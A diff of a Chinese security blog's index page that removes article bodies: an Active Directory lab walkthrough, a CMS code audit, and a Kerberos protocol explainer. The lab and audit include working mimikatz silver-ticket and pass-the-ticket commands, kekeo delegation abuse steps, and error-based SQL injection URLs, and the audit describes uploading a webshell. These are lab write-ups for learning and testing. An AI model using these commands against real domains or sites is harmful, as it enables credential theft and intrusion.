-<p>5.利用的服务(这里选择cifs)</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307230443579.png" alt="image-20220307230443579"></p>
-<p>6.服务账号的ntlm-hash</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307230643890.png" alt="image-20220307230643890"></p>
-<p>在mimikatz中输入以下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:lab.com /sid:S-1-5-21-1799307087-3941118632-</span><br><span class="line">1964125693 /target:DC01.lab.com /service:cifs</span><br><span class="line">/rc4:30ca605fb589087a2ee71051c18821fb /user:solkatt /ptt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307231117784.png" alt="image-20220307231117784"></p>
-<p>测试查询成功！</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307231133882.png" alt="image-20220307231133882"></p>
-<p>ps：黄金票据由krbtgt的Hash加密</p>
-<p>白银由服务账号（通常为计算机账户）HASH加密</p>
-<p>黄金票据的利用过程需要访问域控</p>
-<h2 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h2><p>域委派:将域内用户的权限委派给服务账号，使服务账号能够以用户权限访问域内的其他服务。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220306160727715.png" alt="image-20220306160727715"></p>
-<p>委派前提:需要被委派的用户未设置不允许被委派属性。</p>
-<p>下面的情况不能进行委派:</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307231304888.png" alt="image-20220307231304888"></p>
-<p>经大佬提醒这里可以通过<code>CVE-2020-17049</code>绕过，但是这是后面的了。</p>
-<p>在域中，只有<code>主机账户</code>和<code>服务账号</code>才具有委派属性</p>
-<p>主机账号就是AD活动目录中Computers中的计算机，也可以被称为机器账号(一个普通域用户默认最多可以创建十个主机账号)。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220309103916855.png" alt="image-20220309103916855"></p>
-<p>服务账号（service Account）是域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来并加入域。例如SQLServer服务账号。也可以将域用户通过注册SPN变为服务账号。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1;</span><br><span class="line">Get-NetComputer -Unconstrained -Domain lab.com #查询域中配置⾮约束委派的主机</span><br><span class="line">Get-NetUser -Unconstrained -Domain lab.com | select name #查询域中配置⾮约</span><br><span class="line">束委派的服务账户</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-非约束性委派"><a href="#1-非约束性委派" class="headerlink" title="1.非约束性委派"></a>1.非约束性委派</h3><p>非约束性委派（Unconstrained Delegation）:对于非约束性委派(Unconstrained Delegation)，服务账户可以获取被委任用户的TGT，并将TGT缓存到LSASS进程中，从而服务账户可以使用该TGT，用来模拟该用户的身份访问任意服务。</p>
-<p>ps：设置非约束性委派需要<code>seEnableDelegation</code>特权(域管理员)。</p>
-<p>非约束性委派过程:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.在server上配置了非约束性委派。</span><br><span class="line">2.域内用户访问server的服务，此时需要向kdc进行认证，kdc检查server的机器账号属性为设置了非约束性委派属性，kdc将用户的tgt放入内存。</span><br><span class="line">3.用户访问server，会发送tgt和st给server。</span><br><span class="line">4.server获取到tgt和st，首先验证st，使得用户访问到对应的服务，并将tgt缓存进lsass进程。</span><br></pre></td></tr></table></figure>
-
-<p>当服务账号被设置为非约束性委派时，用户<code>userAccountControl</code>属性会包含为<code>TRUSTED_FOR_DELEGATION</code>。</p>
-<p>当设置为约束性委派时，用户<code>userAccountControl</code>属性包含<code>TRUSTED_TO_AUTHLFOR_DELEGATION</code>。</p>
-<h4 id="测试-3"><a href="#测试-3" class="headerlink" title="测试"></a>测试</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">实验环境：</span><br><span class="line">域控：DC01.lab.com</span><br><span class="line">域内账户：user01</span><br><span class="line">域管账户：admin01</span><br><span class="line">域内服务器【work-server】：work-server.lab.com</span><br><span class="line">域内服务器【win2008】：win2008.lab.com</span><br></pre></td></tr></table></figure>
-
-<p>1.使用admin01账户登录win2008，并在win2008上访问work-server上的cifs服务</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307231544172.png" alt="image-20220307231544172"></p>
-<p>2.在work-server上使用mimikatz抓取admin01的tgt票据信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
-
-<p>会在根目录下生成许多tgt票据</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307231814139.png" alt="image-20220307231814139"></p>
-<p>这里使用<code>[0;1382a4]-2-0-60a10000-admin01@krbtgt-LAB.COM.kirbi</code>，但是为了方便，重命名为admin01.kirbi</p>
-<p>3.使用mimikatz将admin01的tgt加载进入内存</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt admin01.kirbi</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307232005766.png" alt="image-20220307232005766"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307232023809.png" alt="image-20220307232023809"></p>
-<h3 id="2-约束性委派"><a href="#2-约束性委派" class="headerlink" title="2.约束性委派"></a>2.约束性委派</h3><p>由于非约束委派的不安全性，微软在<code>windows server 2003</code>中引入了约束委派，对Kerberos协议进行了拓展，引入了<code>S4U</code>，其中<code>S4U</code>支持两个子协议：<code>Service for User to Self (S4U2Self)</code>和 <code>Service for User to Proxy (S4U2proxy)</code>，这两个扩展都允许服务代表用户从KDC请求票证。<code>S4U2self</code>可以代表自身请求针对其自身的Kerberos服务票据(ST)；<code>S4U2proxy</code>可以以用户的名义请求其它服务的ST，约束委派就是限制了<code>S4U2proxy</code>扩展的范围。</p>
-<p>约束性委派过程:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.在server上配置了约束性委派:服务A配置了到服务B的约束性委派</span><br><span class="line">2.用户访问服务A，首先需要向DC进行认证，认证成功后返回ST-A给用户，用户可以使用ST-A访问服务A。</span><br><span class="line">3.服务A使用S4U2Proxy协议将ST-A以用户的身份发给DC，DC返回一个以用户身份访问服务B的票据ST-B。</span><br><span class="line">4.服务A可以使用ST-B以用户的身份访问服务B。</span><br></pre></td></tr></table></figure>
-
-<h4 id="测试-4"><a href="#测试-4" class="headerlink" title="测试"></a>测试</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">实验环境：</span><br><span class="line">域控：DC01.lab.com</span><br><span class="line">服务账户：user02</span><br><span class="line">域内服务器【work-server】：work-server.lab.com</span><br><span class="line">域内服务器【win2008】：win2008.lab.com</span><br></pre></td></tr></table></figure>
-
-<p>设置约束性委派：可以由user02提供委派凭据给dc01的cifs服务。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307232148616.png" alt="image-20220307232148616"></p>
-<p>1.使用kekoo以服务账号user02的身份获取可转发TGT</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:user02 /domain:lab.com /password:Test.123</span><br></pre></td></tr></table></figure>
-
-<p>/user:服务用户的服务名</p>
-<p>/password:服务用户的明文密码</p>
-<p>/domain:所在域名</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307232515202.png" alt="image-20220307232515202"></p>
-<p>生成TGT为<code>TGT_user02@LAB.COM_krbtgt~lab.com@LAB.COM.kirbi</code></p>
-<p>2.由于存在委派，可以使用服务（user02）的TGT代替用户申请可转发的ST1,并且使用ST1向kdc代替administrator申请访问服务的ST2</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tgs::s4u /tgt:TGT_user02@LAB.COM_krbtgt~lab.com@LAB.COM.kirbi</span><br><span class="line">/user:administrator@lab.com /service:cifs/DC01.lab.com</span><br></pre></td></tr></table></figure>
-
-<p>生成ST2：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307233026575.png" alt="image-20220307233026575"></p>
-<p>3.使用mimikatz加载ST2：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt</span><br><span class="line">TGS_Administrator@lab.com@LAB.COM_cifs~dc01.lab.com@LAB.COM.kirbi</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307233100584.png" alt="image-20220307233100584"></p>
-<h3 id="3-基于资源的约束性委派"><a href="#3-基于资源的约束性委派" class="headerlink" title="3.基于资源的约束性委派"></a>3.基于资源的约束性委派</h3><p>利用条件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.一个机器账户(具有SPN的账号)</span><br><span class="line">2.一个有权力修改msDS-AllowedToActOnBehalfOfOtherIdentity的账户</span><br></pre></td></tr></table></figure>
-
-<p>前提：在服务2上配置服务1到服务2的基于资源的约束性委派（机器⾃身有权限可配置）</p>
-<ol>
-<li>服务1 使⽤⾃⼰的账号密码向KDC申请⼀个可转发的TGT票据。</li>
-<li> 服务1 代表⽤户申请⼀个获得针对服务1⾃身的ST服务票据。这⼀步就是S4U2Self，这⼀ 步区别于传统的约束性委派，在S4u2Self⾥⾯提到，返回的ST票据可转发的⼀个条件是 服务1配置了传统的约束委派。KDC会检查服务1的TrustedToAuthForDelegat ion位和 msDS-A11owedToDelegater。这个字段。这⾥由于基于资源的约束委派，是在服务2上 配置的，服务2的msDS-AllowedToActonBehalfofotherIdentity属性配置了服务1的SPN， 服务1并没有配置TrustedroAuthForDelegation 位和msDS-AllowedroDelegateTo字段。因 此返回的ST票据是不可转发的（在基于资源的委派中，不可转发的ST可以在S4U2Proxy 使⽤）。 </li>
-<li>服务1可以使⽤来⾃⽤户的授权，然后将该不可转发的ST票据(放在Addt ionTicket⾥⾯)向 KDC请求访问服务2的可转发的ST服务票据。</li>
-</ol>
-<h4 id="测试-5"><a href="#测试-5" class="headerlink" title="测试"></a>测试</h4><p>1.创建机器账户</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount machtest1 -Password $(ConvertToSecureString &quot;root&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220309114120209.png" alt="image-20220309114120209"></p>
-<p>2.使该机器账户拥有<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>权限。</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/shanfenglan/test/blob/master/Microsoft.ActiveDirectory.Management.dll%EF%BC%88AD%E6%A8%A1%E5%9D%97%E9%BB%98%E8%AE%A4%E5%8F%AA%E5%9C%A8%E5%9F%9F%E6%8E%A7%E4%B8%8A%E5%AE%89%E8%A3%85%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%B8%8D%E6%98%AF%E5%9F%9F%E6%8E%A7%E5%8F%AF%E4%BB%A5%E4%BB%8E%E5%9F%9F%E6%8E%A7%E4%B8%8A%E6%8A%8ADLL%E6%96%87%E4%BB%B6%E5%A4%8D%E5%88%B6%E5%87%BA%E6%9D%A5%EF%BC%8C%E7%84%B6%E5%90%8E%E5%AF%BC%E5%85%A5%E5%8D%B3%E5%8F%AF%EF%BC%89">https://github.com/shanfenglan/test/blob/master/Microsoft.ActiveDirectory.Management.dll（AD模块默认只在域控上安装，如果不是域控可以从域控上把DLL文件复制出来，然后导入即可）</a></p>
-<p>配置权限命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module .\Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Set-ADComputer dc01 -PrincipalsAllowedToDelegateToAccount machtest1$</span><br></pre></td></tr></table></figure>
-
-<p>验证修改结果</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer dc01 -Properties msdsallowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220309114846622.png" alt="image-20220309114846622"></p>
-<p>接下来就可以通过基于资源的约束委派去攻击目标主机了。</p>
-
+        
+          <a class="article-more-a" href="/2022/03/06/%E5%9F%9F%E6%B8%97%E9%80%8F-pth%E4%B8%8E%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/#more">more >></a>
+        
       
 
       
@@ -843,70 +485,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>在cnvd随意找到了一个漏洞列表里有这个cms，所以就下下来看了看，而且发现该cms貌似很老了，适合我这种菜逼，并且看了一下网上没有相关的审计（应该是太简单了）所以才审计一下（就当是我自己的处女作吧），提升自己。</p>
-<h1 id="主目录"><a href="#主目录" class="headerlink" title="主目录"></a>主目录</h1><p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220303191255330.png" alt="image-20220303191255330"></p>
-<p>该cms目录一目了然，并且非常简单。</p>
-<h1 id="重装漏洞"><a href="#重装漏洞" class="headerlink" title="重装漏洞"></a>重装漏洞</h1><p>该cms的index.php文件里，只对是否已经安装cms做了简单的判断</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220303191710939.png" alt="image-20220303191710939"></p>
-<p>所以即使在安装后，也可以重新访问安装目录再次安装</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220303191746788.png" alt="image-20220303191746788"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220303191806655.png" alt="image-20220303191806655"></p>
-<h1 id="XSS漏洞大集合"><a href="#XSS漏洞大集合" class="headerlink" title="XSS漏洞大集合"></a>XSS漏洞大集合</h1><ol>
-<li>该cms的<code>/admin/add_page.php</code>下有许多echo函数中包括变量的错误，在插入数据库的过程中，该cms的过滤函数只会过滤sql注入</li>
-</ol>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220303194140592.png" alt="image-20220303194140592"></p>
-<p>对xss并没有做任何过滤，所以可以任意插入。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220303194313267.png" alt="image-20220303194313267"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220303194229551.png" alt="image-20220303194229551"></p>
-<p><code>page Position如果不填写数字会报错</code></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220303194324136.png" alt="image-20220303194324136"></p>
-<ol start="2">
-<li>与此同时在<code>admin/add_sidebar.php</code>下也有相同的漏洞，所以可以根据同样的方式来触发xss漏洞</li>
-</ol>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220303195051874.png" alt="image-20220303195051874"></p>
-<h1 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h1><p>在<code>admin/delete_image.php</code>路径下，存在以下函数</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220303213228034.png" alt="image-20220303213228034"></p>
-<p>在根目录下创建test文件夹，并新建一个1.txt</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220303213303323.png" alt="image-20220303213303323"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220303213349012.png" alt="image-20220303213349012"></p>
-<p>删除任意文件成功</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220303213601477.png" alt="image-20220303213601477"></p>
-<h1 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h1><p>在<code>admin/manage_uploads.php</code>中，该cms并没有对上传的文件做任何校验，可以上传任何文件。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220303220323764.png" alt="image-20220303220323764"></p>
-<p>所以上传了一个php码上去，并且测试可以连接shell。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220303220608969.png" alt="image-20220303220608969"></p>
-<p>同时在<code>/admin/addons/imagelibrary/insert_image.php</code>下找到了一个图片编辑器，该编辑器也能自由上传图片，也可以上传php。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220303221734487.png" alt="image-20220303221734487"></p>
-<h1 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h1><ol>
-<li>在<code>/admin/edit_user.php</code>文件下</li>
-</ol>
-<p>有以下代码段</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220304011354156.png" alt="image-20220304011354156"></p>
-<p>id参数由get方式的user参数接受，只要post的password变量为空时，便会进入else判断，将id直接带去sql语句，由此实现数字型注入。</p>
-<p>通过分析可以发现该功能段应该对应的是修改资料功能，随即创建一个账户，选择修改密码</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220304011625402.png" alt="image-20220304011625402"></p>
-<p>通过抓包，修改包的get字段为以下payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=9%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220304011809180.png" alt="image-20220304011809180"></p>
-<p>追踪函数可以发现已经执行了我们的恶意语句</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220304011911037.png" alt="image-20220304011911037"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220304011944138.png" alt="image-20220304011944138"></p>
-<ol start="2">
-<li>在<code>admin/functions/functions.php</code>下</li>
-</ol>
-<p>在该目录下，存在<code>selected_page</code>和<code>get_page_for_editing</code>两个函数</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220304014003897.png" alt="image-20220304014003897"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220304014013420.png" alt="image-20220304014013420"></p>
-<p>可以发现是没有进行过滤直接进行语句执行的，于是查询<code>selected_page</code>函数什么时候被调用过，发现在/admin/add_post.php里面调用过。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220304014233291.png" alt="image-20220304014233291"></p>
-<p>于是我们可以构建payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8096/admin/add_post.php?page=1%20and%20updatexml(1,concat(0x12,(select%20database()),0x12),1)%20--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220304014543533.png" alt="image-20220304014543533"></p>
-<p>成功爆出数据库名</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220304014557876.png" alt="image-20220304014557876"></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总结就是太菜了，sql注入漏洞因为是看到cnvd上有相关链接才去看了一下发生错误的代码,但是也发现seay扫不出sql函数里面有变量的这种可能的漏洞。还有就是缺少框架的训练，会在后面继续训练的。</p>
-
+        
+          <a class="article-more-a" href="/2022/03/03/elitecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#more">more >></a>
+        
       
 
       
@@ -1055,81 +636,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="Kerberos认证"><a href="#Kerberos认证" class="headerlink" title="Kerberos认证"></a>Kerberos认证</h1><p>Kerberos是诞生于上个世纪90年代的计算机认证协议，被广泛应用于各大操作系统和Hadoop生态系统中。了解Kerberos认证的流程将有助于结局Hadoop集群中的安全配置过程中的问题。</p>
-<h2 id="Kerberos解决什么问题？"><a href="#Kerberos解决什么问题？" class="headerlink" title="Kerberos解决什么问题？"></a>Kerberos解决什么问题？</h2><p>简单的说，Kerberos提供了一种单点登录（SSO）的方法。考虑这样一个场景，在一个网络中有不同的服务器，比如，打印服务器、邮件服务器和文件服务器。这些服务器都有认证的需求。很自然的，不可能让每个服务器自己实现一套认证系统，而是提供了一个中心认证服务器（AS-Authentication Server）供这些服务器使用。这样任何客户端就只需维护一个密码就能登录所有服务器。</p>
-<p>因此，在Kerberos系统中至少有三个角色：认证服务器（AS）,客户端(Client)和普通服务器（Server）。客户端和服务器将在AS的帮助下完成相互认证。</p>
-<p>在Kerberos系统中，客户端和服务器都有一个唯一的名字，叫做Principal。同时，客户端和服务器都有自己的密码，并且它们的密码只有自己和认证服务器AS知道。</p>
-<h1 id="Kerberos认证流程"><a href="#Kerberos认证流程" class="headerlink" title="Kerberos认证流程"></a>Kerberos认证流程</h1><p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220227220326166.png" alt="image-20220227220326166"></p>
-<p>client_principal, server_principal: 分别表示客户端和服务器的名字。</p>
-<p>Tc,s: 表示AS发给客户端c的票据，该票据包含有⽤于和服务器s通信认证的相关信息。</p>
-<p>{Kc,s; server_principal,…}Kc: 表示票据的内容，{}⾥⾯的为具体内容。Kc为客户端的密码，表示该票据由客户端的密码加密。其它的类似。</p>
-<p>1.客户端向服务器端发起请求，请求的内容是:我是谁(客户端的principal)，我要和谁通信（服务器的principal）</p>
-<p>2.AS收到请求以后，随机生成一个密码Kc,s(Session Key),并且生成了以下两个票据(Ticket)返回给客户端：</p>
-<p>Tc,s={Kc,s; server_principal,…}Kc:该票据是给客户端的，大括号里面为票据中的内容，后面的Kc为客户端的密码，表示该票据用客户端的密码加倍了。</p>
-<p>Ts,c={Kc,s;client_principal,…}KS 大括号里面为票据中的内容，后面的Ks为服务器的密码，表示该票据用服务器的密码加密了。该票据是给服务器的，但是AS并不直接给服务器，而是交给了客户端再由客户端交给服务器。因为该票据由服务器的密码加密了，所以客户端无法伪造和篡改。</p>
-<p>3.客户端拿到了第二步中的两个票据后，首先用自己的密码解开票据Tc,s得到Kc,s，然后生成一个认证因子(Authenticator),其内容如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authenticator:&#123;time_stamp,Ts,c_checksum,...&#125;Kc,s</span><br></pre></td></tr></table></figure>
-
-<p>其中主要包括当前时间和Ts,c的校验码，并且用SessionKey（Kc,s）加密。客户端将Authenticator和Ts,c同时发给服务器。</p>
-<p>4.服务器首先用自己的密码解开Ts,c，拿到SessionKey（kc,s），然后用Kc，s解开Authenticator，并做如下检查：检查Authenticator中的时间戳是不是在当前时间上下5分钟以内，并且检查该时间戳是否首次出现。如果该时间戳不是第一次出现，那说明有人截获了之前客户端发送的内容，进行Replay攻击。检查Checksum是否正确。如果都正确，客户端就通过了认证。服务器端可选择性地给客户端回复一条消息来完成双向认证，内容如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(time_stamp)Kc,s</span><br></pre></td></tr></table></figure>
-
-<p>其中包括客户端发送过去的时间戳，并且由SessionKey(Kc,s)加密。</p>
-<h2 id="完整认证流程"><a href="#完整认证流程" class="headerlink" title="完整认证流程"></a>完整认证流程</h2><p>比较不方便的是每次认证都需要客户端输入自己的密码。如何解决这个问题，我们再来看一个生活中的例子。某些电影院发行联票，客户只需在花一次钱买张联票(在一定期限内可以兑换一定数量的电影票)。在想看电影的时候，只需要出示联票就可以取一张电影票。这样的好处一是方便，二是相对安全，因为用户无需每次买票的时候都出示信用卡，从而减少了暴露密码的机会。</p>
-<p>类似的，在Kerberos系统中，引入了一个新的角色叫做：票据授权服务(TGS-Ticket Granting Service),它的地位类似于一个普通的服务器，只是它提供的服务是为客户端发放用于和其他服务器认证的票据。</p>
-<p>这样，Kerberos系统中就有四个角色：认证服务器(AS)，客户端(Client)，普通服务器(Server)和票据授权服务(TGS)。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220227222857611.png" alt="image-20220227222857611"></p>
-<p>1.客户端向AS发起请求，请求内容是:我是谁（客户端的principal），我要和票据授权服务通信(TGS的principal)等</p>
-<p>2.AS收到请求后，随机生成一个密码SessionKey(Kc,tgs),并生成以下两个Ticket返回给客户端：</p>
-<p>Tc,tgs={Kc,tgs; tgs_principal; …} Kc - 该票据是给客户端的，⼤括号⾥⾯为票据中的内容，后⾯的Kc为客户端 的密码，表示该票据⽤客户端的密码加密了。</p>
-<p>Ttgs,c={Kc,tgs; client_principal;…} Ktgs - 该票据是给TGS，⼤括号⾥⾯为票据中的内容，后⾯的Ktgs为TGS的密码，表示该票据⽤TGS的密码加密了，只有TGS能解开。</p>
-<p>上述两步和上面简化的认证流程的前两步时一致的，唯一的不一样是与客户端通信的另一端是票据授权服务(TGS)。该步骤中得到的Ttgs,c就类似于例子中的联票，后面将会通过它来得到一张和其他服务器通信认证的票据。</p>
-<p>3.客户端用自己的密码解开Tc,tgs,得到Kc,tgs，生成一个Authenticator，并给TGS发送请求，请求内容是包括:</p>
-<p>Authenticator={time_stamp,Ttgs,c_check_sum,…}Kc,tgs</p>
-<p>Ttgs,c:第二步从AS返回的票据</p>
-<p>server_principal, … </p>
-<p>在这个步骤中，Authenticator和Ttgs,c是⽤于客户端向TGS证明⾃⼰身份的，server_principal是客户端需要 访问的服务器的名字。</p>
-<p>4.TGS收到客户端发送的Authenticator和Ttgs,c后，先用自己的密码解开Ttgs,c，得到SessionKey(Kc,tgs)，然后解开Authenticator，对客户端进行认证，这与简化的认证流程的第四步是一致的。如果客户端通过了认证，TGS生成一个客户端和服务器的SesssionKey(Kc,s),同时将组装下面两个票据返回给客户端：</p>
-<p>Tc,s={Kc,s,sever_principal,…}Kc,tgs:这是给客户端的票据，Kc,s是客户端与服务器之间的SessionKey，用客户端和TGS之间的SessionKey(Kc,Tgs)加密。区别就在这里了，给客户端的票据不再用客户端的密码加密，而是用客户端和Tgs之间的SessionKey加密。</p>
-<p>Ts,c={Kc,s,client_principal,…}Ks:这是给服务器的票据，用服务器的密码加密。</p>
-<p>5.客户端收到上述两个票据后，用Kc,tgs解开Tc,s得到Kc,s，然后生成一个Authenticator并发送请求给服务器，内容包括：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Authenticator=&#123;time_stamp,Ts,c_checksum,...&#125;Kc,S</span><br><span class="line">Ts,c=&#123;Kc,s,client_principal,...&#125;Ks.</span><br></pre></td></tr></table></figure>
-
-<p>6.服务器收到请求后，用自己的密码解开Ts,c得到Kc,s，然后用Kc,s解开Authenticator对客户端进行认证。服务器也可选择性的返回如下信息给客户端来完成双向认证:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;time_stamp&#125;Kc,s</span><br></pre></td></tr></table></figure>
-
-<p><strong>1.AS-REQ</strong></p>
-<p>域内用户访问域中的服务，输入用户名和密码，本机Kerberos服务会向KDC的AS认证服务，发送AS-REQ认证请求。</p>
